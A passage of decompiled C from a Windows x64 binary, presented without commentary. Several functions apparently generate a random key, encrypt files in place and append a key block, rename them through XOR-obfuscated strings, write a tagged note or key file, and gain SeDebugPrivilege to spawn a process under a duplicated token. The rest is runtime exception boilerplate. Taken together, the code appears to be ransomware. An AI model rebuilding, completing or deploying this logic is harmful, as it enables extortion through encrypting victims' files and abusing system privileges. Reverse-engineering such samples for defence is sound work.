    sub_13F1682C0();
  }
LABEL_20:
  sub_13F14088C(v20, v21);
LABEL_22:
  a1->m128i_i64[0] = (__int64)v18;
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1083E0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1083E0(__int64 a1, char a2)
{
  return sub_13F106470((_QWORD *)(a1 - 8), a2);
}

//----- (000000013F1083EC) ----------------------------------------------------
_QWORD *__fastcall sub_13F1083EC(__int64 a1, char a2)
{
  return sub_13F1030D0((_QWORD *)(a1 - 8), a2);
}

//----- (000000013F108530) ----------------------------------------------------
__int64 sub_13F108530(_BYTE *a1, __int64 a2, ...)
{
  __int64 *v4; // rax
  __int64 result; // rax
  va_list va; // [rsp+60h] [rbp+18h] BYREF

  va_start(va, a2);
  v4 = sub_13F1013F0();
  result = sub_13F169A5C(*v4 | 1, a1, 0xFFFFFFFFFFFFFFFFui64, a2, 0i64, (__int64)va);
  if ( (int)result < 0 )
    return 0xFFFFFFFFi64;
  return result;
}

//----- (000000013F108590) ----------------------------------------------------
__int64 __fastcall sub_13F108590(__int64 a1)
{
  int v2; // eax
  unsigned __int64 v3; // rbx
  __int64 i; // rdi
  int v5; // er8
  int v6; // er8
  char v7; // r8
  __int64 v8; // rdi
  char *v9; // rax
  __int64 v10; // rdx
  char *v11; // rcx
  __int128 v12; // xmm0
  __int128 v13; // xmm1
  __int128 v14; // xmm0
  __int128 v15; // xmm1
  __int128 v16; // xmm0
  __int128 v17; // xmm1
  __int128 v18; // xmm0
  __int128 v19; // xmm1
  __int64 v20; // rax
  __int64 v21; // r14
  unsigned int v23; // eax
  signed __int64 v24; // r15
  __int64 v25; // rcx
  __int64 v26; // rsi
  __int64 v27; // rax
  __int64 v28; // r13
  __m128i *v29; // rax
  __int64 v30; // r9
  __m128i *v31; // r12
  __int8 *v32; // r8
  char *v33; // rcx
  __int128 v34; // xmm0
  __int128 v35; // xmm1
  __int128 v36; // xmm0
  __int128 v37; // xmm1
  __int128 v38; // xmm0
  __int128 v39; // xmm1
  __int128 v40; // xmm0
  __int128 v41; // xmm1
  char v42[11]; // [rsp+44h] [rbp-BCh] BYREF
  char v43; // [rsp+4Fh] [rbp-B1h]
  __int64 v44; // [rsp+50h] [rbp-B0h] BYREF
  __int64 v45; // [rsp+58h] [rbp-A8h] BYREF
  __int64 v46; // [rsp+60h] [rbp-A0h]
  char v47[512]; // [rsp+70h] [rbp-90h] BYREF
  unsigned __int64 v48; // [rsp+270h] [rbp+170h]
  unsigned int v49; // [rsp+280h] [rbp+180h] BYREF
  __int64 v50[4]; // [rsp+288h] [rbp+188h] BYREF
  char v51; // [rsp+2A8h] [rbp+1A8h]
  char v52[272]; // [rsp+2B0h] [rbp+1B0h] BYREF
  char v53[4096]; // [rsp+3C0h] [rbp+2C0h] BYREF

  v46 = a1;
  memset(v50, 0, sizeof(v50));
  v51 = 0;
  sub_13F15EF70((__int64)v53, 0, 0x1000ui64);
  v44 = 2048i64;
  v2 = sub_13F169E64(0i64);
  sub_13F167ED4(v2);
  v3 = 0i64;
  for ( i = 0i64; i < 31; ++i )
  {
    v5 = (int)sub_13F167EA8() % 3;
    if ( v5 )
    {
      v6 = v5 - 1;
      if ( v6 )
      {
        if ( v6 == 1 )
          v7 = (int)sub_13F167EA8() % 10 + 48;
        else
          v7 = 0;
      }
      else
      {
        v7 = (int)sub_13F167EA8() % 26 + 97;
      }
    }
    else
    {
      v7 = (int)sub_13F167EA8() % 26 + 65;
    }
    *((_BYTE *)v50 + i) = v7;
  }
  sub_13F17A920((__int64)qword_13F1C70F0, 548i64, (__int64)v50, 0x20ui64, (__int64)v53, &v44);
  v8 = 4i64;
  v9 = v47;
  v10 = 4i64;
  v11 = v53;
  do
  {
    v9 += 128;
    v12 = *(_OWORD *)v11;
    v13 = *((_OWORD *)v11 + 1);
    v11 += 128;
    *((_OWORD *)v9 - 8) = v12;
    v14 = *((_OWORD *)v11 - 6);
    *((_OWORD *)v9 - 7) = v13;
    v15 = *((_OWORD *)v11 - 5);
    *((_OWORD *)v9 - 6) = v14;
    v16 = *((_OWORD *)v11 - 4);
    *((_OWORD *)v9 - 5) = v15;
    v17 = *((_OWORD *)v11 - 3);
    *((_OWORD *)v9 - 4) = v16;
    v18 = *((_OWORD *)v11 - 2);
    *((_OWORD *)v9 - 3) = v17;
    v19 = *((_OWORD *)v11 - 1);
    *((_OWORD *)v9 - 2) = v18;
    *((_OWORD *)v9 - 1) = v19;
    --v10;
  }
  while ( v10 );
  *(_OWORD *)v9 = *(_OWORD *)v11;
  v20 = MEMORY[0x76F91B80](a1, 3221225472i64, 0i64, 0i64, 3, 0x8000000, 0i64);
  v21 = v20;
  if ( v20 == -1 )
    return 0i64;
  v23 = MEMORY[0x76F7EE70](v20, &v49);
  v24 = v23 | ((unsigned __int64)v49 << 32);
  v25 = 48 * (v24 / 48);
  v26 = v25 + 528;
  if ( v24 != v25 )
    v26 = v25 + 576;
  v48 = v23 | ((unsigned __int64)v49 << 32);
  if ( v24
    && (v27 = MEMORY[0x76F7DF80](v21, 0i64, 4i64, v26 >> 32, v26, 0i64), (v28 = v27) != 0)
    && (v29 = (__m128i *)MEMORY[0x76F7D840](v27, 983071i64, 0i64, 0i64, v26), (v31 = v29) != 0i64) )
  {
    v45 = v26 - 528;
    v32 = &v29[-33].m128i_i8[v26];
    v33 = v47;
    do
    {
      v32 += 128;
      v34 = *(_OWORD *)v33;
      v35 = *((_OWORD *)v33 + 1);
      v33 += 128;
      *((_OWORD *)v32 - 8) = v34;
      v36 = *((_OWORD *)v33 - 6);
      *((_OWORD *)v32 - 7) = v35;
      v37 = *((_OWORD *)v33 - 5);
      *((_OWORD *)v32 - 6) = v36;
      v38 = *((_OWORD *)v33 - 4);
      *((_OWORD *)v32 - 5) = v37;
      v39 = *((_OWORD *)v33 - 3);
      *((_OWORD *)v32 - 4) = v38;
      v40 = *((_OWORD *)v33 - 2);
      *((_OWORD *)v32 - 3) = v39;
      v41 = *((_OWORD *)v33 - 1);
      *((_OWORD *)v32 - 2) = v40;
      *((_OWORD *)v32 - 1) = v41;
      --v8;
    }
    while ( v8 );
    *(_OWORD *)v32 = *(_OWORD *)v33;
    sub_13F17ADE0((__int64)v33, v24, (__int64)v50, v30, v29, &v45);
    MEMORY[0x76F91F10](v31);
    MEMORY[0x76F91910](v28);
    MEMORY[0x76F91910](v21);
    sub_13F15EF70((__int64)v52, 0, 0x104ui64);
    qmemcpy(v42, "c5h\a", 4);
    v42[4] = 18;
    v42[5] = 9;
    v42[6] = 11;
    v42[7] = 21;
    v42[8] = 15;
    v42[9] = 10;
    v42[10] = 9;
    v43 = 0;
    do
      v42[v3++] ^= 0x46u;
    while ( v3 < 0xB );
    v43 = 0;
    MEMORY[0x7710BB3C](v52, v42, v46);
    return MEMORY[0x76FFF940](v46, v52);
  }
  else
  {
    MEMORY[0x76F91910](v21);
    return 0i64;
  }
}
// 13F10891B: variable 'v30' is possibly undefined
// 13F1B91E8: using guessed type __int64 qword_13F1B91E8;
// 13F1C70F0: using guessed type __int64 qword_13F1C70F0[512];

//----- (000000013F108A30) ----------------------------------------------------
__int64 __fastcall sub_13F108A30(__int64 a1, char a2)
{
  unsigned __int64 v4; // rdx
  unsigned __int64 i; // r8
  unsigned __int64 j; // rax
  unsigned __int64 k; // r8
  __int64 v8; // rdi
  __int64 v9; // rdx
  __int64 result; // rax
  __int64 *v11; // rdx
  __int64 v12; // rbx
  __int64 v13; // r8
  __int64 v14; // rcx
  unsigned __int64 v15; // rdx
  char v16[12]; // [rsp+44h] [rbp-BCh] BYREF
  char v17[8]; // [rsp+50h] [rbp-B0h] BYREF
  int v18; // [rsp+58h] [rbp-A8h]
  char v19[20]; // [rsp+5Ch] [rbp-A4h] BYREF
  int v20; // [rsp+70h] [rbp-90h]
  _DWORD v21[10]; // [rsp+74h] [rbp-8Ch] BYREF
  _DWORD v22[8]; // [rsp+9Ch] [rbp-64h] BYREF
  int v23; // [rsp+BCh] [rbp-44h] BYREF
  __int64 v24[2]; // [rsp+C0h] [rbp-40h] BYREF
  unsigned int v25; // [rsp+D0h] [rbp-30h]
  unsigned __int64 v26; // [rsp+D8h] [rbp-28h]
  char v27[8]; // [rsp+E0h] [rbp-20h] BYREF
  char v28[8]; // [rsp+E8h] [rbp-18h] BYREF
  __int64 v29[3]; // [rsp+F0h] [rbp-10h] BYREF
  int v30; // [rsp+108h] [rbp+8h]
  __int16 v31; // [rsp+10Ch] [rbp+Ch]
  char v32[272]; // [rsp+110h] [rbp+10h] BYREF
  char v33[272]; // [rsp+220h] [rbp+120h] BYREF
  char v34[272]; // [rsp+330h] [rbp+230h] BYREF

  sub_13F15EF70((__int64)v33, 0, 0x104ui64);
  strcpy(v28, "<asf>");
  strcpy(v27, "</asf>");
  memset(v29, 0, sizeof(v29));
  v30 = 0;
  v31 = 0;
  v22[7] = 0;
  sub_13F15EF70((__int64)v32, 0, 0x104ui64);
  sub_13F15EF70((__int64)v34, 0, 0x104ui64);
  v23 = 260;
  MEMORY[0x76F7E120](v32, &v23);
  v16[0] = 77;
  v16[1] = 17;
  v16[2] = 0;
  v16[3] = 18;
  v16[4] = 75;
  v16[5] = 83;
  v16[6] = 19;
  v16[7] = 68;
  v16[8] = 86;
  v16[9] = 25;
  v16[10] = 8;
  v4 = 0i64;
  v16[11] = 26;
  strcpy(v17, "C");
  do
  {
    v16[v4] ^= (_BYTE)v4 + 113;
    ++v4;
  }
  while ( v4 < 0xD );
  v17[1] = 0;
  sub_13F108530(v29, (__int64)v16, 3i64);
  v20 = 93;
  strcpy((char *)v21, "a?.;cx.ar?.;car.-<3car?29$car5)01c");
  for ( i = 0i64; i < 0x22; ++i )
    *((_BYTE *)v21 + i) ^= v20;
  BYTE2(v21[8]) = 0;
  sub_13F108530(v34, (__int64)v21, v32);
  if ( a2 )
  {
    v18 = 69;
    strcpy(v19, "`5\x1B!'..4c&;==");
    for ( j = 0i64; j < 0xD; ++j )
      v19[j] ^= (_BYTE)j + (_BYTE)v18;
    v19[13] = 0;
    sub_13F108530(v33, (__int64)v19, a1);
  }
  else
  {
    v21[9] = 28;
    strcpy((char *)v22, "9o@NY]XQY1ZUPY19o19x2th}");
    for ( k = 0i64; k < 0x18; ++k )
      *((_BYTE *)v22 + k) ^= LOBYTE(v21[9]);
    LOBYTE(v22[6]) = 0;
    sub_13F108530(v33, (__int64)v22, a1, v32, 1632064957i64);
  }
  v8 = MEMORY[0x76F91B80](v33, 3221225472i64, 0i64, 0i64, 2, 128, 0i64);
  result = sub_13F17A2F0((__int64)v24, v9, 0xC00u);
  if ( v8 != -1 )
  {
    MEMORY[0x76F91F30](v8, qword_13F1BB3A0, 6684i64, &v22[7], 0i64);
    MEMORY[0x76F91F30](v8, v28, 5i64, &v22[7], 0i64);
    v11 = v24;
    if ( v26 >= 0x10 )
      v11 = (__int64 *)v24[0];
    MEMORY[0x76F91F30](v8, v11, v25, &v22[7], 0i64);
    MEMORY[0x76F91F30](v8, v27, 6i64, &v22[7], 0i64);
    v12 = -1i64;
    v13 = -1i64;
    do
      ++v13;
    while ( *((_BYTE *)v29 + v13) );
    MEMORY[0x76F91F30](v8, v29, v13, &v22[7], 0i64);
    do
      ++v12;
    while ( v34[v12] );
    MEMORY[0x76F91F30](v8, v34, v12, &v22[7], 0i64);
    result = MEMORY[0x76F91910](v8);
  }
  if ( v26 >= 0x10 )
  {
    v14 = v24[0];
    v15 = v26 + 1;
    if ( v26 + 1 >= 0x1000 )
    {
      v14 = *(_QWORD *)(v24[0] - 8);
      v15 = v26 + 40;
      if ( (unsigned __int64)(v24[0] - v14 - 8) > 0x1F )
        sub_13F1682C0();
    }
    return sub_13F14088C(v14, v15);
  }
  return result;
}
// 13F108ED0: variable 'v9' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1BB3A0: using guessed type __int64 qword_13F1BB3A0[2];
// 13F108A30: using guessed type char var_120[272];

//----- (000000013F109030) ----------------------------------------------------
__int64 __fastcall sub_13F109030(__int64 a1)
{
  unsigned int v1; // ebx
  int v3; // edi
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v7; // [rsp+60h] [rbp-A0h] BYREF
  __int64 v8; // [rsp+68h] [rbp-98h] BYREF
  __int64 v9; // [rsp+70h] [rbp-90h] BYREF
  __int64 v10; // [rsp+78h] [rbp-88h] BYREF
  int v11[4]; // [rsp+80h] [rbp-80h] BYREF
  const char *v12; // [rsp+90h] [rbp-70h]
  unsigned int v13; // [rsp+F0h] [rbp-10h] BYREF
  __int64 v14; // [rsp+F8h] [rbp-8h] BYREF
  int v15; // [rsp+100h] [rbp+0h] BYREF
  __int64 v16; // [rsp+104h] [rbp+4h]
  int v17; // [rsp+10Ch] [rbp+Ch]
  __int64 v18[3]; // [rsp+110h] [rbp+10h] BYREF

  v1 = 0;
  v10 = 0i64;
  v7 = 0i64;
  v9 = 0i64;
  v13 = MEMORY[0x76FBCA80]();
  MEMORY[0x7FEFAF018F0](v13, &v10);
  v3 = 48;
  sub_13F15EF70((__int64)v11, 0, 0x68ui64);
  v11[0] = 104;
  memset(v18, 0, sizeof(v18));
  v12 = "winsta0\\default";
  v4 = MEMORY[0x76F85190]();
  if ( !(unsigned int)MEMORY[0x7FEFF1FD8D0](v4, 131563i64, &v9)
    || !(unsigned int)MEMORY[0x7FEFF1E1B50](0i64, "SeDebugPrivilege", &v14)
    || (v16 = v14, v15 = 1, v17 = 2, !(unsigned int)MEMORY[0x7FEFF1EF9F8](v9, 0x2000000i64, 0i64, 1i64, 1, &v7))
    || !(unsigned int)MEMORY[0x7FEFF1ED3C0](v7, 12i64, &v13, 4i64)
    || !(unsigned int)MEMORY[0x7FEFF1FDC00](v7, 0i64, &v15, 16i64, 0i64, 0i64)
    || ((v8 = 0i64, !(unsigned int)MEMORY[0x7FEFCF710B0](&v8, v7, 1i64)) ? (v5 = 0i64, v8 = 0i64) : (v5 = v8, v3 = 1072),
        !(unsigned int)MEMORY[0x7FEFF22A8D0](v7, 0i64, a1, 0i64, 0i64, 0, v3, v5, 0i64, v11, v18)) )
  {
    v1 = MEMORY[0x76F91760]();
  }
  if ( v10 )
    MEMORY[0x76F91910]();
  if ( v7 )
    MEMORY[0x76F91910]();
  if ( v9 )
    MEMORY[0x76F91910]();
  return v1;
}

//----- (000000013F109250) ----------------------------------------------------
__int64 sub_13F109250()
{
  unsigned __int64 v0; // r9
  unsigned __int64 i; // rax
  __int64 result; // rax
  __int64 v3; // rbx
  unsigned __int64 j; // rdx
  unsigned __int64 v5; // rdx
  char v6[16]; // [rsp+54h] [rbp-ACh] BYREF
  _DWORD v7[2]; // [rsp+64h] [rbp-9Ch] BYREF
  char v8[15]; // [rsp+6Ch] [rbp-94h] BYREF
  char v9[21]; // [rsp+7Bh] [rbp-85h] BYREF
  int v10; // [rsp+90h] [rbp-70h]
  char v11[12]; // [rsp+94h] [rbp-6Ch] BYREF
  __int64 v12; // [rsp+A0h] [rbp-60h] BYREF
  __int64 v13; // [rsp+A8h] [rbp-58h]
  __int64 v14; // [rsp+B0h] [rbp-50h]
  int v15[4]; // [rsp+C0h] [rbp-40h] BYREF
  const char *v16; // [rsp+D0h] [rbp-30h]
  int v17[4]; // [rsp+130h] [rbp+30h] BYREF
  char v18[272]; // [rsp+140h] [rbp+40h] BYREF
  char v19[272]; // [rsp+250h] [rbp+150h] BYREF

  sub_13F15EF70((__int64)v19, 0, 0x104ui64);
  sub_13F15EF70((__int64)v18, 0, 0x104ui64);
  sub_13F15EF70((__int64)v15, 0, 0x68ui64);
  v15[0] = 104;
  v12 = 0i64;
  v13 = 0i64;
  v0 = 0i64;
  v14 = 0i64;
  v16 = "winsta0\\default";
  v17[0] = 0;
  v10 = 97;
  strcpy(v11, "14#-(\"");
  do
    v11[v0++] ^= v10;
  while ( v0 < 6 );
  v11[6] = 0;
  MEMORY[0x76F85960](v11, v19, 260i64);
  qmemcpy(v6, "f|fgxeaa", 8);
  v6[8] = 2;
  v6[9] = 98;
  v6[10] = 116;
  v6[11] = 115;
  v6[12] = 119;
  v6[13] = 121;
  v6[14] = 112;
  v6[15] = 24;
  strcpy((char *)v7, "_LX");
  for ( i = 0i64; i < 0x13; ++i )
    v6[i] ^= (_BYTE)i + 39;
  HIBYTE(v7[0]) = 0;
  sub_13F108530(v18, (__int64)"%s\\%s", v19, v6);
  result = MEMORY[0x76F91B80](v18, 3221225472i64, 0i64, 0i64, 2, 128, 0i64);
  v3 = result;
  if ( result != -1 )
  {
    MEMORY[0x76F91F30](result, qword_13F1BB3A0, 6684i64, v17, 0i64);
    v7[1] = 72;
    v8[0] = 9;
    v8[1] = 29;
    v8[2] = 5;
    v8[3] = 6;
    v8[4] = 31;
    v8[5] = 4;
    v8[6] = 2;
    v8[7] = 0;
    v8[8] = 125;
    v8[9] = 3;
    v8[10] = 23;
    v8[11] = 18;
    v8[12] = 16;
    v8[13] = 24;
    v8[14] = 19;
    strcpy(v9, "y0-;");
    for ( j = 0i64; j < 0x13; ++j )
      v8[j] ^= (_BYTE)j + LOBYTE(v7[1]);
    v9[4] = 0;
    v5 = 0i64;
    strcpy(&v9[5], "oujvc\"$'u^'u$");
    do
      v9[v5++ + 5] -= 2;
    while ( v5 < 0xD );
    sub_13F108530(v18, (__int64)&v9[5], v19, v8);
    MEMORY[0x76F91910](v3);
    sub_13F109030((__int64)v18);
    MEMORY[0x7700AFC0](0i64, v18, 0i64, 0i64, 0, 0, 0i64, 0i64, v15, &v12);
    MEMORY[0x76F91910](v12);
    return MEMORY[0x76F91910](v13);
  }
  return result;
}
// 13F1BB3A0: using guessed type __int64 qword_13F1BB3A0[2];
// 13F109250: using guessed type int var_240[4];

//----- (000000013F109708) ----------------------------------------------------
_QWORD *__fastcall sub_13F109708(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F180600;
  return a1;
}
// 13F180600: using guessed type __int64 (__fastcall *off_13F180600[2])();

//----- (000000013F109748) ----------------------------------------------------
_QWORD *__fastcall sub_13F109748(_QWORD *a1)
{
  a1[2] = 0i64;
  a1[1] = "bad allocation";
  *a1 = off_13F180600;
  return a1;
}
// 13F180600: using guessed type __int64 (__fastcall *off_13F180600[2])();

//----- (000000013F109768) ----------------------------------------------------
_QWORD *__fastcall sub_13F109768(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F180640;
  return a1;
}
// 13F180640: using guessed type __int64 (__fastcall *off_13F180640[3])();

//----- (000000013F1097A8) ----------------------------------------------------
_QWORD *__fastcall sub_13F1097A8(_QWORD *a1, __int64 a2)
{
  __int64 v4; // [rsp+20h] [rbp-18h] BYREF
  char v5; // [rsp+28h] [rbp-10h]

  v5 = 1;
  v4 = a2;
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C((__int64)&v4, (__int64)(a1 + 1));
  *a1 = off_13F180640;
  return a1;
}
// 13F180640: using guessed type __int64 (__fastcall *off_13F180640[3])();

//----- (000000013F1097F4) ----------------------------------------------------
_QWORD *__fastcall sub_13F1097F4(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F180658;
  return a1;
}
// 13F180658: using guessed type __int64 (__fastcall *off_13F180658[3])();

//----- (000000013F109834) ----------------------------------------------------
_QWORD *__fastcall sub_13F109834(_QWORD *a1, __int64 a2)
{
  __int64 v4; // [rsp+20h] [rbp-18h] BYREF
  char v5; // [rsp+28h] [rbp-10h]

  v5 = 1;
  v4 = a2;
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C((__int64)&v4, (__int64)(a1 + 1));
  *a1 = off_13F180658;
  return a1;
}
// 13F180658: using guessed type __int64 (__fastcall *off_13F180658[3])();

//----- (000000013F109880) ----------------------------------------------------
_QWORD *__fastcall sub_13F109880(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = &std::logic_error::`vftable';
  return a1;
}
// 13F180628: using guessed type void *std::logic_error::`vftable';

//----- (000000013F1098C0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1098C0(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F180670;
  return a1;
}
// 13F180670: using guessed type __int64 (__fastcall *off_13F180670[3])();

//----- (000000013F109900) ----------------------------------------------------
_QWORD *__fastcall sub_13F109900(_QWORD *a1, __int64 a2)
{
  __int64 v4; // [rsp+20h] [rbp-18h] BYREF
  char v5; // [rsp+28h] [rbp-10h]

  v5 = 1;
  v4 = a2;
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C((__int64)&v4, (__int64)(a1 + 1));
  *a1 = off_13F180670;
  return a1;
}
// 13F180670: using guessed type __int64 (__fastcall *off_13F180670[3])();

//----- (000000013F10994C) ----------------------------------------------------
_QWORD *__fastcall sub_13F10994C(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F180688;
  return a1;
}
// 13F180688: using guessed type __int64 (__fastcall *off_13F180688[2])();

//----- (000000013F10998C) ----------------------------------------------------
void __fastcall __noreturn sub_13F10998C(__int64 a1)
{
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  sub_13F109834(pExceptionObject, a1);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVlength_error_std__);
}
// 13F10998C: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F1099B0) ----------------------------------------------------
void __fastcall __noreturn sub_13F1099B0(__int64 a1)
{
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  sub_13F109900(pExceptionObject, a1);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVout_of_range_std__);
}
// 13F1099B0: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F1099D4) ----------------------------------------------------
__int64 __fastcall sub_13F1099D4(__int64 a1, _QWORD *a2)
{
  a2[1] = 3i64;
  *a2 = off_13F180830;
  return 1i64;
}
// 13F180830: using guessed type __int64 (__fastcall *off_13F180830[6])();

//----- (000000013F1099EC) ----------------------------------------------------
__int64 __fastcall sub_13F1099EC(__int64 a1, __int128 *a2, const __m128i *a3)
{
  __m128i *v5; // rax
  unsigned __int64 v6; // rdx
  __int64 v7; // rcx
  unsigned __int64 v8; // rdx
  __int128 v9; // xmm0
  __int64 result; // rax
  __int128 v11; // [rsp+20h] [rbp-60h] BYREF
  __m128i v12; // [rsp+30h] [rbp-50h] BYREF
  __int64 v13; // [rsp+40h] [rbp-40h]
  __int64 v14; // [rsp+48h] [rbp-38h]
  __m128i v15; // [rsp+50h] [rbp-30h] BYREF
  unsigned __int64 v16; // [rsp+68h] [rbp-18h]

  v13 = 0i64;
  v14 = 0i64;
  sub_13F106E40((__m128i **)&v12, a3);
  v11 = *a2;
  v5 = sub_13F109CE8(&v15, (unsigned int *)&v11, &v12);
  if ( v5[1].m128i_i64[1] >= 0x10ui64 )
    v5 = (__m128i *)v5->m128i_i64[0];
  *(_QWORD *)&v11 = v5;
  BYTE8(v11) = 1;
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C((__int64)&v11, a1 + 8);
  v6 = v16;
  *(_QWORD *)a1 = off_13F180688;
  if ( v6 >= 0x10 )
  {
    v7 = v15.m128i_i64[0];
    v8 = v6 + 1;
    if ( v8 >= 0x1000 )
    {
      v7 = *(_QWORD *)(v15.m128i_i64[0] - 8);
      v8 += 39i64;
      if ( (unsigned __int64)(v15.m128i_i64[0] - v7 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v7, v8);
  }
  v9 = *a2;
  *(_QWORD *)a1 = &std::_System_error::`vftable';
  result = a1;
  *(_OWORD *)(a1 + 24) = v9;
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180688: using guessed type __int64 (__fastcall *off_13F180688[2])();
// 13F1807F8: using guessed type void *std::_System_error::`vftable';
// 13F1099EC: using guessed type __m128i var_30;

//----- (000000013F109AE4) ----------------------------------------------------
__int64 __fastcall sub_13F109AE4(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C(a2 + 8, a1 + 8);
  *(_QWORD *)a1 = &std::_System_error::`vftable';
  result = a1;
  *(_OWORD *)(a1 + 24) = *(_OWORD *)(a2 + 24);
  return result;
}
// 13F1807F8: using guessed type void *std::_System_error::`vftable';

//----- (000000013F109B38) ----------------------------------------------------
__int64 __fastcall sub_13F109B38(__int64 a1, __int64 a2)
{
  __int128 v4; // xmm0
  __int64 result; // rax

  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C(a2 + 8, a1 + 8);
  *(_QWORD *)a1 = &std::_System_error::`vftable';
  v4 = *(_OWORD *)(a2 + 24);
  *(_QWORD *)a1 = off_13F180818;
  result = a1;
  *(_OWORD *)(a1 + 24) = v4;
  return result;
}
// 13F1807F8: using guessed type void *std::_System_error::`vftable';
// 13F180818: using guessed type __int64 (__fastcall *off_13F180818[3])();

//----- (000000013F109B94) ----------------------------------------------------
_QWORD *__fastcall sub_13F109B94(_QWORD *a1, int a2, __int64 a3, const __m128i *a4)
{
  __int64 v7; // rdx
  __int64 v8; // rcx
  __int128 v10; // [rsp+20h] [rbp-48h] BYREF
  __int64 v11; // [rsp+30h] [rbp-38h]
  __m128i v12; // [rsp+38h] [rbp-30h] BYREF
  __m128i si128; // [rsp+48h] [rbp-20h]

  v11 = -2i64;
  si128 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v12.m128i_i8[0] = 0;
  sub_13F106C30(&v12, a4);
  LODWORD(v10) = a2;
  *((_QWORD *)&v10 + 1) = a3;
  sub_13F1099EC((__int64)a1, &v10, &v12);
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v7 = si128.m128i_i64[1] + 1;
    v8 = v12.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v7 = si128.m128i_i64[1] + 40;
      v8 = *(_QWORD *)(v12.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v12.m128i_i64[0] - v8 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v8, v7);
  }
  *a1 = off_13F180818;
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F180818: using guessed type __int64 (__fastcall *off_13F180818[3])();
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F109C80) ----------------------------------------------------
__int64 __fastcall sub_13F109C80(__int64 a1, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 16i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F109CA4) ----------------------------------------------------
_QWORD *__fastcall sub_13F109CA4(_QWORD *a1, char a2)
{
  *a1 = &std::exception::`vftable';
  sub_13F15E4FC((__int64)(a1 + 1));
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 40i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F109CE8) ----------------------------------------------------
__m128i *__fastcall sub_13F109CE8(__m128i *a1, unsigned int *a2, __m128i *a3)
{
  const __m128i *v6; // rdx
  unsigned __int64 v7; // rdx
  __int64 v8; // rcx
  __int64 v10[3]; // [rsp+30h] [rbp-48h] BYREF
  unsigned __int64 v11; // [rsp+48h] [rbp-30h]

  if ( a3[1].m128i_i64[0] )
    sub_13F106DB0(a3, (const __m128i *)qword_13F180808, 2ui64);
  (*(void (__fastcall **)(_QWORD, __int64 *, _QWORD))(**((_QWORD **)a2 + 1) + 16i64))(*((_QWORD *)a2 + 1), v10, *a2);
  v6 = (const __m128i *)v10;
  if ( v11 >= 0x10 )
    v6 = (const __m128i *)v10[0];
  sub_13F106DB0(a3, v6, v10[2]);
  if ( v11 >= 0x10 )
  {
    v7 = v11 + 1;
    v8 = v10[0];
    if ( v11 + 1 >= 0x1000 )
    {
      v7 = v11 + 40;
      v8 = *(_QWORD *)(v10[0] - 8);
      if ( (unsigned __int64)(v10[0] - v8 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v8, v7);
  }
  a1[1].m128i_i64[0] = 0i64;
  a1[1].m128i_i64[1] = 0i64;
  *a1 = *a3;
  a1[1] = a3[1];
